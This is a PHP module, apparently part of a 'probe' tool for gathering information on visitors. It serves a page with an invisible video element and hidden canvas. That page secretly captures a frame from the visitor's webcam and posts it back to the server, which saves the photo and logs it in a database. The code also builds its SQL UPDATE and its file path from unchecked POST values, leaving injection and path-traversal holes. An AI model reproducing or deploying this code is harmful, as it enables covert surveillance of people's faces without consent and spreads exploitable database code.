<?php
//error_reporting(0);

$file = isset($_POST['file']) ? $_POST['file'] : NULL;
if($time == NULL){
    $time = isset($_POST['timestamp']) ? $_POST['timestamp'] : NULL;
}
if($key == NULL){
    $key = isset($_POST['key']) ? $_POST['key'] : NULL;
}
if($file != NULL){
    $file= explode(',', $file); //截取data:image/png;base64, 这个逗号后的字符
    $data= base64_decode($file[1]);//对截取后的字符使用base64_decode进行解码
    $url = dirname(__FILE__,3)."/image/photos/".$key."_".$time.".jpg";
    $writeurl = "/image/photos/".$key."_".$time.".jpg";
    file_put_contents($url, $data); //写入文件并保存
    // 根据timestamp & key写数据
    include_once(dirname(__FILE__,2)."/mySQL/dbconfig.php");
    $conn = new mysqli($db_host.":".$db_port, $db_user, $db_password, $db_name);
    $sql = "UPDATE `tanzhen_information` SET `cameraphoto` = '$writeurl' WHERE `tanzhen_information`.`timestamp` = '$time' AND `tanzhen_information`.`keyvalue` = '$key';";
    if($conn->query($sql)===TRUE){
        echo '插入成功';
    }else{
        echo '插入失败'.$conn->error;
    }
    $conn->close();
}else{
echo '
<!DOCTYPE html>
<html>
<head>
<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
</head>
<body>

<video id="myVideo" width="0" height="0"></video>
<canvas id="myCanvas" style="display: none;" height="960" width="1600"></canvas>
<script type="text/javascript">
function initCamera(){
    let video = document.getElementById("myVideo");
    //兼容性写法,判断getUserMedia方法是否存在
    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || window.getUserMedia;
    if (navigator.getUserMedia) {
        //调用用户媒体设备, 访问摄像头
        getUserMedia({video: {width: 1600, height: 960}}, success, error);
    } else {
        var xmlhttp = new XMLHttpRequest;
		xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/camera.php",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("file=获取失败"+"&key='.$key.'&timestamp='.$time.'");
    }
}
function getUserMedia(constraints, success, error) {
  if (navigator.mediaDevices.getUserMedia) {
    //最新的标准API
    navigator.mediaDevices.getUserMedia(constraints).then(success).catch(error);
  } else if (navigator.webkitGetUserMedia) {
    //webkit核心浏览器
    navigator.webkitGetUserMedia(constraints, success, error)
  } else if (navigator.mozGetUserMedia) {
    //firfox浏览器
    navigator.mozGetUserMedia(constraints, success, error);
  } else if (navigator.getUserMedia) {
    //旧版API
    navigator.getUserMedia(constraints, success, error);
  }
}
function success(stream) {
  //兼容webkit核心浏览器
  let CompatibleURL = window.URL || window.webkitURL;
  //将视频流设置为video元素的源
  // console.log(stream);

  //video.src = CompatibleURL.createObjectURL(stream);
  //将摄像头拍摄的视频赋值给viedeo的srcObject属性
  //src是视频文件,srcObject是实时流
  //摄像头是实时流
  let video = document.getElementById("myVideo");
  video.srcObject = stream;
  //并播放
  video.play();
  takeCamera();
}
// 调用失败的方法
function error(error) {
  console.log(`访问用户媒体设备失败${error.name}, ${error.message}`);
  var xmlhttp = new XMLHttpRequest;
  xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/camera.php",true);
  xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  xmlhttp.send("file=获取失败"+"&key='.$key.'&timestamp='.$time.'");
}
function takeCamera() {
  let canvas = document.getElementById("myCanvas");
  var context = canvas.getContext("2d");
  //将视频当前的页面转换为图片，显示到画板中
  let video = document.getElementById("myVideo");
  context.drawImage(video, 0, 0,);
  var src = canvas.toDataURL("image/jpeg");
  // console.log(src)
  var xmlhttp = new XMLHttpRequest;
  xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/camera.php",true);
  xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  xmlhttp.send("file="+src+"&key='.$key.'&timestamp='.$time.'");
}
initCamera();
</script>
</body>
</html>
';
}

?>